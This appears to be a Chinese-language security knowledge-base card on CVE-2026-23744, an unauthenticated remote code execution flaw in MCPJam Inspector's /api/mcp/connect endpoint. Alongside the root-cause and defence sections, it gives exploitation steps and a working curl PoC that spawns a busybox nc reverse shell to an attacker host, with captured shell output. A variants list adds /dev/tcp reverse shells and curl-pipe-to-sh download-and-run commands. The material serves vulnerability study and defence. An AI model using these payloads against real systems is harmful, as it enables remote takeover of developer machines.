---
id: ai-security-mcpjam-inspector-api-mcp-connect-rce
title: MCPJam Inspector /api/mcp/connect 未授权 RCE：serverConfig command/args 直接启动进程（CVE-2026-23744）
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcpjam-connect-serverconfig-rce
aliases:
- CVE-2026-23744
- MCPJam inspector RCE
- /api/mcp/connect 未授权
- serverConfig command 注入
- MCP Inspector 远程命令执行
- GHSA-232v-j27c-5pp6
tags:
- mcp
- inspector
- rce
- unauthenticated
- command-execution
- nodejs
- localhost
- cve
cve:
- CVE-2026-23744
severity: critical
confidence: high
affected_versions: 'MCPJam Inspector <= 1.4.2（原文 GHSA-232v-j27c-5pp6，Patched versions: None）'
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V64
  verified_at: '2026-11-05T12:00:14+08:00'
  notes: 已对照原文与图01-04、GHSA-232v-j27c-5pp6核对：MCPJam Inspector 默认绑定 0.0.0.0、/api/mcp/connect 未授权，受影响 <=1.4.2、Patched None、CVSS 9.8、CVE-2026-23744；原文 curl 传 serverConfig command=busybox args=nc ... -e bash，图04 回连 uid=1001(mcp-dev)。未验证点：PoC 未本机复跑；原文未展示接口响应体，卡内“无认证/无用户交互”依据 GHSA 描述与实测回连；affected_versions 按 GHSA 原文标记设置。
---

## 一句话结论

MCPJam Inspector 默认绑定 `0.0.0.0`，其 `/api/mcp/connect` 接口无需认证即可接收 `serverConfig.command`、`args`、`env` 并启动 MCP server 子进程；攻击者直接 POST 一个 `busybox nc <ip> <port> -e bash` 配置，就能在目标主机上以运行 Inspector 的用户身份获得反弹 shell（CVE-2026-23744，CVSS 9.8）。

## 原理

- MCPJam Inspector 是 MCP server 的本地开发/调试平台，正常用途是让开发者配置并启动一个 MCP server 进程（stdio transport），因此 `serverConfig` 中的 `command`、`args`、`env` 本来就是“要执行的程序”。
- 漏洞版本把 HTTP 服务绑定在 `0.0.0.0`（而非 127.0.0.1），且 `/api/mcp/connect` 没有认证/授权中间件；任何能访问 6274 端口的人都能提交 `serverConfig`，服务端按配置启动子进程。
- 这与“命令注入”不同：接口设计上就允许指定命令，缺的是“谁可以调用”的边界。绑定 `0.0.0.0` 使本地开发工具变成远程可调用的进程启动器。
- 攻击者只需构造一个合法的 MCP server 配置，把 command 换成 `busybox`、args 换成 `nc <attacker> <port> -e bash`，即可得到反弹 shell；不需要任何 token、Cookie 或用户交互。
- 同类问题在 MCP Inspector 生态反复出现：官方 Inspector 的 CVE-2025-49596 是浏览器跨站调用 `/stdio`（需要受害者访问恶意页面），本条是直接远程 HTTP 调用（无需用户交互），危害更直接。

## 触发条件

- 目标运行 MCPJam Inspector <= 1.4.2，且 HTTP 端口（常见 6274）可从攻击者网络访问。
- `/api/mcp/connect` 未启用认证或来源限制。
- Inspector 进程有权限执行目标命令（通常为启动它的用户，可能是开发/运维账号）。
- 攻击者有一个可接收反弹连接的公网/内网地址。

## 利用步骤

1. 端口扫描发现 6274 等服务，访问首页/静态资源识别 MCPJam Inspector 及其版本。
2. 直接向 `/api/mcp/connect` 发送 JSON，`serverConfig.command` 填 `busybox`，`args` 填 `nc <attacker-ip> <port> -e bash`。
3. 在攻击机监听对应端口，等待目标回连。
4. 收到 shell 后确认身份（`id`），必要时用 `script /dev/null` 获取交互式 TTY。
5. 以该用户身份继续信息收集、横向或提权。

## PoC

```bash
# 攻击机监听
nc -lvnp 8888

# 目标：未授权提交 serverConfig，启动反弹 shell
curl -s http://target:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"serverConfig":{"command":"busybox","args":["nc","<attacker-ip>","8888","-e","bash"],"env":{}},"serverId":"mytest"}'
```

```text
# 攻击机收到
connect to [<attacker-ip>] from (UNKNOWN) [target] ...
id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

## 变体与关联

- 变体：把 command/args 换成 `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`、`python3 -c ...`、`curl <url>|sh` 等，取决于目标可用程序。
- 变体：除反弹 shell 外，也可启动一个读取敏感文件/执行单条命令的 MCP server，把结果通过 MCP 响应带回（若接口返回子进程输出）。
- 变体：官方 MCP Inspector 的 CVE-2025-49596 是浏览器跨站 `/stdio` 链，见 [[ai-security-mcp-security-inspector-cors-stdio-rce]]；本条是 MCPJam 的直接远程 HTTP 链。
- 关联：[[ai-security-mcp-stdio-endpoint-command-injection]]（MCP stdio endpoint 命令注入）、[[ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding]]（MCP 控制面缺少来源校验）。
- 边界：升级到修复版本、绑定 127.0.0.1、增加认证/来源白名单、或网络层禁止访问 6274 时，本手法不成立。

## 检测与防御

- 检测：访问 `/api/mcp/connect` 的请求中出现 `command` 为 shell/网络工具（busybox、nc、bash、python、curl）或 `args` 含反弹 shell 特征；来自非开发网段的 6274 访问。
- 检测：Inspector 进程拉起非预期子进程（nc/bash/python），或出现对外连接；主机出现新监听/反弹连接。
- 防御：升级/移除受影响版本（原文标注 Patched versions: None，需以官方后续公告为准）；将 Inspector 绑定 127.0.0.1，不要暴露到 0.0.0.0。
- 防御：在 `/api/mcp/connect` 前加认证与来源白名单；限制可启动的 command/args；以最小权限用户运行 Inspector。
- 加固：开发工具默认只监听 loopback，按需启动、用完关闭；网络层限制 6274 出站/入站；监控子进程与异常外联。
